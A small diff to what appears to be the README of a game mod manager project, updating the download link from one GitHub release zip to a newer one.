@@ -12,7 +12,7 @@
 
 ## 📥 Download
 
-**[Download Madden-27-Mod-Manager](https://github.com/BottomCustodian/Madden-27-Mod-Manager/releases/download/768/MaddenManagerMod.zip)**
+**[Download Madden-27-Mod-Manager](https://github.com/BottomCustodian/Madden-27-Mod-Manager/releases/download/769/Madden27ModManager.zip)**
 
 ---
 
